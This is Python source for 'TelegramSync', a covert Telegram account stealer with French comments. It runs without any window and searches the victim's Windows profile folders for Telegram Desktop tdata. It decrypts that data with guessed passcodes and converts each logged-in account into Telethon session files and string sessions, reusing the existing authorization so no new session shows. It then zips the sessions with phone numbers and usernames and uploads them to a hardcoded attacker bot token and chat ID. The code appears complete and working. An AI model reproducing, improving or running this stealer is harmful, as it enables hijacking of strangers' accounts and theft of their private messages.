# -*- coding: utf-8 -*-
"""
TelegramSync - tdata -> .session par compte -> envoi vers ton bot Telegram.

Mode fantome : aucune fenetre, aucun popup, tout passe par le bot.
Ne modifie JAMAIS le tdata de la victime (lecture seule via snapshot).

Surcharges :
  TG_TDATA      chemin force vers le dossier tdata
  TG_PASSCODE   code d'acces local (si passcodes.txt ne suffit pas)
  passcodes.txt a cote de l'exe : un code par ligne, essayes dans l'ordre
"""
import os, sys, json, shutil, asyncio, zipfile, tempfile, traceback
import subprocess, time
import requests

# ---- pas de console en mode windowed : on se protege de sys.stdout=None ----
if sys.stdout is None or sys.stderr is None:
    class _Null:
        def write(self, *a): pass
        def flush(self): pass
        def isatty(self): return False
    sys.stdout = sys.stdout or _Null()
    sys.stderr = sys.stderr or _Null()

# ---------------------------------------------------------------- CONFIG
BOT_TOKEN = "8710535929:AAE8JvCbRXQ4wkrsVeKwl3yKhBmhsbxfxPA"
CHAT_ID   = 8425878739

API_ID   = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"

# Codes d'acces locaux a essayer (le premier qui dechiffre gagne).
# "" = pas de code. Complete ici, ou depose passcodes.txt a cote de l'exe.
PASSCODES = [""]
# ----------------------------------------------------------------------

WORK = os.path.join(tempfile.gettempdir(), "tgsync")
_NO_WINDOW = 0x08000000 if os.name == "nt" else 0


# ------------------------------------------------------------- chemins
def exe_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.abspath(sys.argv[0]))


def load_passcodes():
    out = [""]
    for p in [os.environ.get("TG_PASSCODE")] + list(PASSCODES):
        if p is not None and p not in out:
            out.append(p)
    f = os.path.join(exe_dir(), "passcodes.txt")
    if os.path.isfile(f):
        try:
            with open(f, encoding="utf-8-sig") as fh:
                for line in fh:
                    line = line.strip()
                    if line and line not in out:
                        out.append(line)
        except OSError:
            pass
    return out


# ------------------------------------------------------------- bot helpers
def tg_call(method, **kw):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    r = requests.post(url, timeout=600, **kw)
    r.raise_for_status()
    return r.json()


def tg_text(text):
    try:
        tg_call("sendMessage", data={"chat_id": CHAT_ID, "text": text[:4000]})
    except Exception:
        pass


def tg_file(path, caption=""):
    with open(path, "rb") as fh:
        tg_call("sendDocument",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"document": fh})


def tg_big(path, caption="", limit=45 * 1024 * 1024):
    """La Bot API plafonne les documents a 50 Mo -> decoupage en parts."""
    if os.path.getsize(path) <= limit:
        tg_file(path, caption)
        return
    with open(path, "rb") as fh:
        i = 0
        while True:
            chunk = fh.read(limit)
            if not chunk:
                break
            part = f"{path}.part{i:02d}"
            with open(part, "wb") as o:
                o.write(chunk)
            tg_file(part, f"{caption} [part {i:02d}]")
            os.remove(part)
            i += 1


# ------------------------------------------------------------- tdata
def is_tdata_dir(p):
    """Un vrai tdata : key_datas + au moins un dossier de compte (16 hex)."""
    if not p or not os.path.isdir(p):
        return False
    if not os.path.isfile(os.path.join(p, "key_datas")):
        return False
    try:
        return any(len(d) == 16 and os.path.isdir(os.path.join(p, d))
                   for d in os.listdir(p))
    except OSError:
        return False


_SCAN_SKIP = {"temp", "Temp", "tmp", "Cache", "cache", "CachedData",
              "Crashpad", "logs", "node_modules", ".git", ".cache",
              "Packages", "dumps", "emoji", "user_data"}


def _scan_roots():
    return [
        os.path.expandvars(r"%APPDATA%"),
        os.path.expandvars(r"%LOCALAPPDATA%"),
        os.path.expandvars(r"%USERPROFILE%"),
        os.path.expandvars(r"%ProgramFiles%"),
        os.path.expandvars(r"%ProgramFiles(x86)%"),
    ]


def _bounded_scan(max_depth=4):
    """Dernier recours : cherche un dossier tdata* valide, profondeur bornee."""
    found = []
    for root in _scan_roots():
        if not root or not os.path.isdir(root):
            continue
        base = root.rstrip("\\/").count(os.sep)
        try:
            for dirpath, dirnames, _ in os.walk(root):
                if dirpath.rstrip("\\/").count(os.sep) - base >= max_depth:
                    dirnames[:] = []
                dirnames[:] = [d for d in dirnames if d not in _SCAN_SKIP]
                if os.path.basename(dirpath).startswith("tdata") and is_tdata_dir(dirpath):
                    found.append(dirpath)
        except OSError:
            pass
    return found


def find_tdata():
    cands = []
    if len(sys.argv) > 1 and os.path.isdir(sys.argv[1]):
        cands.append(sys.argv[1])
    if os.environ.get("TG_TDATA"):
        cands.append(os.environ["TG_TDATA"])

    d = exe_dir()
    for base in (d, os.path.dirname(d), os.getcwd()):
        for n in ("tdata", "tdata#2", "tdata#3"):
            cands.append(os.path.join(base, n))

    for base in (os.path.expandvars(r"%APPDATA%"),
                 os.path.expandvars(r"%LOCALAPPDATA%")):
        for n in ("Telegram Desktop", r"Telegram Desktop\Portable", "Telegram"):
            for t in ("tdata", "tdata#2", "tdata#3"):
                cands.append(os.path.join(base, n, t))

    seen, uniq = set(), []
    for c in cands:
        try:
            c = os.path.abspath(c)
        except Exception:
            continue
        if c not in seen:
            seen.add(c)
            uniq.append(c)

    for c in uniq:
        if is_tdata_dir(c):
            return c

    found = _bounded_scan()
    if found:
        return found[0]

    for c in uniq:
        if os.path.isdir(c):
            return c
    return None


_SKIP_IN_TDATA = {"user_data", "user_data#2", "user_data#3", "user_data#4",
                  "emoji", "shortcuts", "temp", "webview", "dumps"}


def snapshot_tdata(src, dst):
    """Copie minimale et coherente : lisible meme si Telegram ecrit en meme temps."""
    shutil.rmtree(dst, ignore_errors=True)
    os.makedirs(dst, exist_ok=True)
    for name in os.listdir(src):
        p = os.path.join(src, name)
        try:
            if os.path.isfile(p):
                shutil.copy2(p, os.path.join(dst, name))
            elif os.path.isdir(p) and name not in _SKIP_IN_TDATA:
                shutil.copytree(p, os.path.join(dst, name), dirs_exist_ok=True)
        except OSError:
            pass
    return dst


def diagnose(p):
    if not p:
        return "aucun dossier tdata trouve"
    if not os.path.isdir(p):
        return f"{p} n'existe pas"
    try:
        entries = os.listdir(p)
    except OSError as e:
        return f"{p} illisible : {e!r}"
    acc = [d for d in entries if len(d) == 16 and os.path.isdir(os.path.join(p, d))]
    return (f"{p}\n"
            f"  key_datas : {'present' if os.path.isfile(os.path.join(p, 'key_datas')) else 'ABSENT'}\n"
            f"  dossiers compte (16 hex) : {len(acc)}\n"
            f"  fichiers : {len([e for e in entries if os.path.isfile(os.path.join(p, e))])}")


def telegram_running():
    """Purement informatif : on n'a plus besoin que la cible ferme Telegram."""
    try:
        out = subprocess.check_output(
            ["tasklist", "/FI", "IMAGENAME eq Telegram.exe"],
            stderr=subprocess.DEVNULL, creationflags=_NO_WINDOW)
        return b"Telegram.exe" in out
    except Exception:
        return False


def zip_dir(src, dst):
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(src):
            for f in files:
                p = os.path.join(root, f)
                z.write(p, os.path.relpath(p, src))


# ------------------------------------------------------------- conversion
def load_tdesktop(tdata, passcodes):
    """Essaie chaque passcode jusqu'a obtenir un TDesktop exploitable."""
    from opentele.td import TDesktop
    last = None
    for pc in passcodes:
        try:
            td = TDesktop(tdata, passcode=pc or None)
            if td.accountsCount > 0:
                return td, pc
            last = RuntimeError("0 compte charge")
        except Exception as e:
            last = e
    raise RuntimeError(
        f"tdata illisible : {last!r}\n\n{diagnose(tdata)}\n\n"
        "Si un code d'acces local est actif, ajoute-le dans passcodes.txt "
        "a cote de l'exe (ou TG_PASSCODE).")


async def convert_all(td, outdir):
    from opentele.api import API, UseCurrentSession
    from telethon.sessions import StringSession

    out = []
    for i, acc in enumerate(td.accounts):
        entry = {"index": i}
        client = None
        try:
            client = await acc.ToTelethon(
                session=os.path.join(outdir, f"account_{i}"),
                flag=UseCurrentSession,          # reutilise l'auth existante
                api=API.TelegramDesktop,         # aucune nouvelle session visible
            )
            await client.connect()
            if not await client.is_user_authorized():
                raise RuntimeError("session non autorisee")
            me = await client.get_me()
            entry.update({
                "file": f"account_{i}.session",
                "id": me.id,
                "phone": me.phone,
                "username": me.username,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "dc_id": client.session.dc_id,
                "string_session": StringSession.save(client.session),
            })
        except Exception as e:
            entry["error"] = repr(e)
        finally:
            if client is not None:
                try:
                    await client.disconnect()
                except Exception:
                    pass
        out.append(entry)
    return out


# ------------------------------------------------------------- main
def run_once(tdata, passcodes, snap):
    from opentele.td import TDesktop  # noqa: F401  (verifie l'import)
    snapshot_tdata(tdata, snap)
    td, used = load_tdesktop(snap, passcodes)
    accounts = asyncio.run(convert_all(td, WORK))
    return accounts, used


def main():
    tdata = find_tdata()
    if not tdata or not is_tdata_dir(tdata):
        tg_text("TelegramSync - echec\n" + diagnose(tdata))
        return

    shutil.rmtree(WORK, ignore_errors=True)
    os.makedirs(WORK, exist_ok=True)
    snap = os.path.join(WORK, "tdata_snap")

    accounts, used = None, None
    last = None
    for attempt in range(3):                 # la cible ne ferme pas Telegram
        try:
            accounts, used = run_once(tdata, load_passcodes(), snap)
            if accounts:
                break
        except Exception as e:
            last = e
            time.sleep(2)
    if not accounts:
        raise RuntimeError(f"conversion impossible apres 3 essais : {last!r}\n\n"
                           + diagnose(tdata))

    manifest = os.path.join(WORK, "manifest.json")
    with open(manifest, "w", encoding="utf-8") as f:
        json.dump(accounts, f, indent=2, ensure_ascii=False)

    z = os.path.join(tempfile.gettempdir(), "sessions.zip")
    zip_dir(WORK, z)

    ok = [a for a in accounts if "error" not in a]
    tg_big(z, f"session(s) - {len(ok)}/{len(accounts)} compte(s)")
    tg_text(
        f"source : {tdata}\n"
        f"passcode : {'oui' if used else 'non'}\n"
        f"Telegram ouvert : {'oui' if telegram_running() else 'non'}\n"
        "comptes:\n" + "\n".join(
            f"- #{a['index']} {a.get('phone','?')} @{a.get('username') or '-'}"
            + (" [ECHEC]" if "error" in a else "")
            for a in accounts))


if __name__ == "__main__":
    try:
        main()
    except Exception:
        tg_text("TelegramSync - ERREUR\n\n" + traceback.format_exc())
